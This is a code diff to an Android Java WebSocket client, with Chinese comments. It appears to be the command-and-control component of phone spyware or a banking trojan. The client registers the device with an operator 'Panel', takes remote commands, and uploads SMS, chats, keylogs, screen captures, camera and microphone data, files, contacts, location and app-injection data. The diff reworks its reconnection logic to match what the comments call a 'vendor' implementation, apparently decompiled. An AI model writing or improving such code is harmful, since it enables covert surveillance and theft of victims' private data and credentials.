@@ -5,8 +5,6 @@ import android.util.Log;
 import com.google.gson.Gson;
 import com.google.gson.JsonObject;
 
-import java.util.concurrent.Executors;
-import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
@@ -19,18 +17,16 @@ import okhttp3.WebSocketListener;
 /**
  * WebSocket 客户端 — 适配 Laravel Swoole WebSocket 协议
  *
+ * 对齐 vendor bridge/a.java 的连接管理模式:
+ *   - 不在客户端内部做自动重连
+ *   - 断开时仅清理状态 (connected=false)
+ *   - 重连由 KeepHeartThread 统一管理 (每 10s 检测并重连)
+ *   - 避免并发重连竞争
+ *
  * Laravel 协议格式:
  *   设备端 itype = "Slr_client"
  *   路由字段: itype + subc
  *   设备标识: pid (phoneId/deviceId)
- *
- * 功能:
- *   - 连接 Laravel Swoole WebSocket (ws://host:8081)
- *   - 首条 ping 消息即完成设备注册 (DeviceHandler 自动 registerDevice)
- *   - 心跳: subc="ping" + URL-encoded 设备状态
- *   - 数据上报: subc="sms/screen/files/cam/mic/..." + 对应数据
- *   - 接收 Panel 下发的控制命令 (type="screencomd" 等)
- *   - 自动重连 (指数退避)
  */
 public class WebSocketClient extends WebSocketListener {
 
@@ -54,13 +50,8 @@ public class WebSocketClient extends WebSocketListener {
     private OkHttpClient client;
     private WebSocket webSocket;
     private final AtomicBoolean connected = new AtomicBoolean(false);
+    private final AtomicBoolean connecting = new AtomicBoolean(false);
     private CommandListener commandListener;
-
-    // 重连参数
-    private int reconnectAttempts = 0;
-    private static final int MAX_RECONNECT_ATTEMPTS = 10;
-    private static final long BASE_RECONNECT_DELAY = 3000L; // 3 秒
-    private final ScheduledExecutorService reconnectExecutor = Executors.newSingleThreadScheduledExecutor();
 
     // 首次连接时的初始状态参数 (由 KeepHeartThread 设置)
     private volatile String initialStatusParams;
@@ -79,11 +70,15 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 连接 WebSocket 服务器
+     * 线程安全: connecting CAS 防止并发连接
+     * 对齐 vendor: bridge/a.u() — 每次由外部 (KeepHeartThread) 调用
      */
     public void connect() {
         if (connected.get()) return;
+        if (!connecting.compareAndSet(false, true)) return;
         if (wsUrl == null || wsUrl.isEmpty()) {
             Log.w(TAG, "WebSocket URL is null, skipping connect");
+            connecting.set(false);
             return;
         }
 
@@ -104,6 +99,7 @@ public class WebSocketClient extends WebSocketListener {
             webSocket.close(NORMAL_CLOSURE, "Client disconnect");
         }
         connected.set(false);
+        connecting.set(false);
     }
 
     /**
@@ -131,10 +127,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 发送心跳 (subc="ping")
-     * Laravel DeviceHandler 用 parse_str() 解析 msg 字段
-     *
-     * @param encodedStatus URL-encoded 设备状态参数
-     *   如: phone_name=Huawei+P40&model=ELS-AN00&battery_charge=85%25&accessibility=1
      */
     public void sendPing(String encodedStatus) {
         JsonObject msg = newBaseMessage(SUBC_PING);
@@ -144,7 +136,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 通用数据上报 (msg 字段)
-     * 适用于: sms, chat, files, savefiles, snap, loc, loadapps, loadcontacts, injapps, klogs, klogsdate
      */
     public void sendData(String subc, String data) {
         JsonObject msg = newBaseMessage(subc);
@@ -154,7 +145,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 屏幕数据上报
-     * 对齐 DeviceHandler 的 screen/screenshot 处理: img + wmob + hmob
      */
     public void sendScreen(String subc, String imgBase64, int width, int height) {
         JsonObject msg = newBaseMessage(subc);
@@ -166,7 +156,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 相机数据上报
-     * 对齐 DeviceHandler 的 cam 处理: img 字段
      */
     public void sendCamera(String imgBase64) {
         JsonObject msg = newBaseMessage(SUBC_CAM);
@@ -176,7 +165,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 麦克风数据上报
-     * 对齐 DeviceHandler 的 mic 处理: voip 字段
      */
     public void sendMic(String audioData) {
         JsonObject msg = newBaseMessage(SUBC_MIC);
@@ -186,7 +174,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 缩略图上报
-     * 对齐 DeviceHandler 的 thumb 处理: msg + pth 字段
      */
     public void sendThumb(String data, String path) {
         JsonObject msg = newBaseMessage(SUBC_THUMB);
@@ -197,7 +184,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 文件下载分块上报
-     * 对齐 DeviceHandler 的 down 处理
      */
     public void sendFileChunk(String filename, String filedata, long totalSize,
                               long sentSize, int chunkNumber, String filehash, String filepath) {
@@ -214,7 +200,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 文件搜索结果上报
-     * 对齐 DeviceHandler 的 srch 处理: pths + stype 字段
      */
     public void sendSearchResult(String paths, String searchType) {
         JsonObject msg = newBaseMessage(SUBC_SRCH);
@@ -225,7 +210,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 代理状态上报
-     * 对齐 DeviceHandler 的 proxy 处理
      */
     public void sendProxy(String ctype, JsonObject extraFields) {
         JsonObject msg = newBaseMessage(SUBC_PROXY);
@@ -245,35 +229,15 @@ public class WebSocketClient extends WebSocketListener {
         this.initialStatusParams = params;
     }
 
-    /**
-     * 重连 (使用 ScheduledExecutorService 避免线程泄漏)
-     */
-    public void reconnect() {
-        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
-            Log.e(TAG, "Max reconnect attempts reached, resetting counter");
-            reconnectAttempts = 0;
-            return;
-        }
-
-        long rawDelay = BASE_RECONNECT_DELAY * (long) Math.pow(2, reconnectAttempts);
-        final long delay = Math.min(rawDelay, 60000L); // 最大 60 秒
-
-        reconnectAttempts++;
-        Log.d(TAG, "Reconnecting in " + delay + "ms (attempt " + reconnectAttempts + ")");
-
-        reconnectExecutor.schedule(this::connect, delay, TimeUnit.MILLISECONDS);
-    }
-
     // ============ WebSocketListener 回调 ============
 
     @Override
     public void onOpen(WebSocket ws, Response response) {
         connected.set(true);
-        reconnectAttempts = 0;
+        connecting.set(false);
         Log.i(TAG, "WebSocket connected to: " + wsUrl);
 
         // 首条 ping 消息即完成设备注册
-        // Laravel MessageRouter → DeviceHandler.handle() → registerDevice(fd, phoneId)
         String status = initialStatusParams != null ? initialStatusParams : "";
         sendPing(status);
         Log.d(TAG, "Registration ping sent: pid=" + deviceId);
@@ -290,7 +254,6 @@ public class WebSocketClient extends WebSocketListener {
             String type = json.has("type") ? json.get("type").getAsString() : null;
             String subc = json.has("subc") ? json.get("subc").getAsString() : null;
 
-            // 服务端心跳响应，忽略
             if ("pong".equals(type)) {
                 return;
             }
@@ -304,23 +267,32 @@ public class WebSocketClient extends WebSocketListener {
     @Override
     public void onClosing(WebSocket ws, int code, String reason) {
         connected.set(false);
+        connecting.set(false);
         Log.d(TAG, "WebSocket closing: " + code + " " + reason);
     }
 
+    /**
+     * 对齐 vendor: 断开时仅清理状态，不自动重连
+     * vendor bridge/a → f1.a.i() → f138w.set(false) + q.g(bridgePath) → 置 null
+     * 重连由 KeepHeartThread 在下次 tick 时处理
+     */
     @Override
     public void onClosed(WebSocket ws, int code, String reason) {
         connected.set(false);
+        connecting.set(false);
         Log.d(TAG, "WebSocket closed: " + code + " " + reason);
-        if (code != NORMAL_CLOSURE) {
-            reconnect();
-        }
     }
 
+    /**
+     * 对齐 vendor: 连接失败时仅清理状态，不自动重连
+     * vendor bridge/a.w() → f138w.set(false) + q.g(bridgePath)
+     * KeepHeartThread 会在下次 tick (≤10s) 检测到断开并重连
+     */
     @Override
     public void onFailure(WebSocket ws, Throwable t, Response response) {
         connected.set(false);
-        Log.e(TAG, "WebSocket failure", t);
-        reconnect();
+        connecting.set(false);
+        Log.e(TAG, "WebSocket failure: " + t.getMessage());
     }
 
     // ============ Getters & Setters ============
@@ -334,8 +306,6 @@ public class WebSocketClient extends WebSocketListener {
 
     /**
      * 命令监听接口
-     * Panel 通过 PanelSendHandler 下发命令，格式:
-     *   {"type":"screencomd", "subc":"Screen", "comdtype":"SM"}
      */
     public interface CommandListener {
         void onCommand(String type, String subc, JsonObject payload);
